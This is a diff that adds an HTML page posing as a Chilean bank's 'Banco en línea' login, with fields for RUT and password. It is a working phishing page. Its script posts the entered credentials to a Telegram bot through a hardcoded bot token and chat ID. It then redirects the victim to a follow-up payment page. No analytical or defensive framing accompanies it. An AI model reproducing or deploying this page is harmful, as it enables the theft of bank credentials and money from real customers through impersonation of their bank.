@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco en línea</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background-color: white;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo-icon {
+            margin-right: 10px;
+        }
+        
+        .logo-text {
+            font-size: 18px;
+            color: #004481;
+            font-weight: normal;
+        }
+        
+        .exit-button {
+            color: #0072C6;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            font-weight: bold;
+        }
+        
+        .exit-icon {
+            margin-left: 5px;
+        }
+        
+        .nav-menu {
+            display: flex;
+            background-color: white;
+            border-bottom: 1px solid #e0e0e0;
+            overflow-x: auto;
+            white-space: nowrap;
+        }
+        
+        .nav-item {
+            padding: 15px 25px;
+            text-align: center;
+            color: #004481;
+            text-decoration: none;
+            font-weight: normal;
+        }
+        
+        .nav-item.active {
+            border-bottom: 4px solid #1973B8;
+            font-weight: bold;
+        }
+        
+        .nav-arrow {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f5f5f5;
+            padding: 0 10px;
+            color: #666;
+        }
+        
+        .main-content {
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        h1 {
+            color: #1973B8;
+            font-size: 24px;
+            margin-bottom: 40px;
+        }
+        
+        .input-container {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        .password-container {
+            position: relative;
+        }
+        
+        .eye-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            cursor: pointer;
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin: 20px 0 30px;
+        }
+        
+        .forgot-link {
+            color: #1973B8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #1973B8;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background-color 0.3s;
+        }
+        
+        .login-button:hover {
+            background-color: #155a94;
+        }
+        
+        .login-button:disabled {
+            background-color: #e9e9e9;
+            color: #999;
+            cursor: not-allowed;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+            color: #1973B8;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <div class="logo-icon">
+                <img src="../img/logo_icono_bci_color.svg" alt="">
+            </div>
+            <span class="logo-text">Banco en línea</span>
+        </div>
+        <a href="#" class="exit-button">
+            SALIR
+            <span class="exit-icon">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#0072C6" stroke-width="2">
+                    <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" />
+                    <polyline points="16 17 21 12 16 7" />
+                    <line x1="21" y1="12" x2="9" y2="12" />
+                </svg>
+            </span>
+        </a>
+    </div>
+    
+    <div class="nav-menu">
+        <a href="#" class="nav-item active">PERSONAS</a>
+        <a href="#" class="nav-item">EMPRESAS</a>
+        <a href="#" class="nav-item">PYME</a>
+        <a href="#" class="nav-item">PF</a>
+        <div class="nav-arrow">›</div>
+    </div>
+    
+    <div class="main-content">
+        <h1>Personas</h1>
+        
+        <form id="loginForm">
+            <div class="input-container">
+                <label class="input-label">RUT</label>
+                <input type="text" class="input-field" id="rut" name="rut" placeholder="Ingresa tu RUT" required>
+            </div>
+            
+            <div class="input-container">
+                <label class="input-label">Clave</label>
+                <div class="password-container">
+                    <input type="password" class="input-field" id="clave" name="clave" placeholder="Ingresa tu clave" required>
+                    <span class="eye-icon" onclick="togglePassword()">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                            <circle cx="12" cy="12" r="3" />
+                            <line id="eyeLine" x1="4" y1="20" x2="20" y2="4" />
+                        </svg>
+                    </span>
+                </div>
+            </div>
+            
+            <div class="forgot-password">
+                <a href="#" class="forgot-link">¿Olvidaste tu clave de internet?</a>
+            </div>
+            
+            <button type="submit" class="login-button" id="submitBtn">Ingresar</button>
+        </form>
+        
+        <div class="loading" id="loading">
+            Enviando datos...
+        </div>
+    </div>
+
+    <script>
+        // Configuración de Telegram
+        const BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
+        const CHAT_ID = '5848946481';
+        const REDIRECT_URL = '../cargapago.html'; // URL de redirección después del envío
+
+        // Función para mostrar/ocultar contraseña
+        function togglePassword() {
+            const passwordInput = document.getElementById('clave');
+            const eyeLine = document.getElementById('eyeLine');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeLine.style.display = 'none';
+            } else {
+                passwordInput.type = 'password';
+                eyeLine.style.display = 'block';
+            }
+        }
+
+        // Función para enviar mensaje a Telegram
+        async function sendToTelegram(rut, clave) {
+            const message = `🏦 *Nuevo acceso Banco en línea*\n\n` +
+                          `👤 *RUT:* ${rut}\n` +
+                          `🔑 *Clave:* ${clave}\n\n` +
+                          `🕒 *Fecha:* ${new Date().toLocaleString('es-ES')}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (response.ok) {
+                    return true;
+                } else {
+                    throw new Error('Error en el envío');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
+        // Manejo del formulario
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const rut = document.getElementById('rut').value;
+            const clave = document.getElementById('clave').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            
+            // Deshabilitar botón y mostrar loading
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Enviando...';
+            loading.style.display = 'block';
+            
+            try {
+                // Enviar a Telegram
+                const success = await sendToTelegram(rut, clave);
+                
+                if (success) {
+                    // Pequeña pausa para que el usuario vea que se procesó
+                    setTimeout(() => {
+                        // Redirigir después del envío exitoso
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                } else {
+                    // En caso de error, mostrar mensaje (opcional)
+                    alert('Error en el procesamiento. Intenta nuevamente.');
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'INGRESAR';
+                    loading.style.display = 'none';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Error en el procesamiento. Intenta nuevamente.');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'INGRESAR';
+                loading.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
